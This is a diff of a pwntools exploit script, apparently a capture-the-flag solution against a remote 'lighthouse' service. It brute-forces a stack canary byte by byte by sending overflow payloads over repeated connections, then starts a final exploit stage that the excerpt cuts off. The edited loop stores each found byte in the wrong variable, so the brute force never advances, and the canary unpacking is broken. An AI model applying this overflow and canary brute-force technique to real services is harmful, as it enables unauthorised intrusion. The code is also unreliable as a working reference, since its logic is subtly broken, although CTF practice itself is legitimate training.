@@ -10,51 +10,40 @@ win_addr = 0x401630
 HOST, PORT = 'offsec.m0lecon.it', 13578
 # canary for this instance: 0x8392adae9215300
 
-elf = ELF('./lighthouse', checksec=False)
-context.log_level = 'info'
+#elf = ELF('./lighthouse', checksec=False)
 
-# --- FASE 1: BRUTE-FORCE DEL CANARY ---
-known_canary = b"\x00"  # Il primo byte è sempre 0x00
-
-log.info("Inizio brute-force del Canary (8 byte)...")
+known_canary = b"\x00"  # first byte is always 0x00
 
 for i in range(7):
-    break
     for bval in range(256):
+        guess = known_canary + bytes([bval])
+        payload = b"A" * OFFSET_TO_CANARY + guess
+
         io = remote(HOST, PORT, level='error')
+
+        # select the option with the vuln function
+        io.recvuntil(b"> ")
+        io.sendline(b"1") 
+
+        io.recvuntil(b"entry: ")
+
+        io.send(payload)
         try:
-            io.recvuntil(b"> ")
-            io.sendline(b"1") # Entriamo in vuln()
-            io.recvuntil(b"entry: ")
-
-            # Testiamo il byte successivo
-            guess = known_canary + bytes([bval])
-            payload = b"A" * OFFSET_TO_CANARY + guess
-            
-            io.send(payload) # Usiamo send per non aggiungere \n indesiderati
-            
-            # Se il canary è corretto, leggiamo il messaggio di successo
-            # Se è sbagliato, il server chiude la connessione (EOF)
-            response = io.recvall(timeout=0.2)
-            
-            if b"Log entry recorded" in response:
-                known_canary = guess
-                log.success(f"Trovato byte {i+1}/7: {hex(bval)}")
-                io.close()
-                break
-            
-            io.close()
+            data = io.recvall(timeout=0.2)
         except EOFError:
-            io.close()
-            continue
+            data = b""
+        io.close()
 
-#canary_val = u64(known_canary.ljust(8, b"\x00"))
-#canary = u64(known_canary)
-canary = 0x8392adae9215300
-log.success(f"Canary completo: {canary:#x}")
+        if b"Log entry recorded" in data:
+            known = guess
+            print(f"byte {i+1}: {bval:02x}")
+            break
 
-# --- FASE 2: EXPLOIT FINALE ---
-log.info("Lancio dell'exploit finale...")
+canary_val = u64(known_canary.ljust(8, b"\x00"))
+canary = u64(known_canary)
+print(f"Canary completo: {canary:#x}")
+
+# final exploit
 
 io = remote(HOST,PORT)
 io.recvuntil(b"> ")
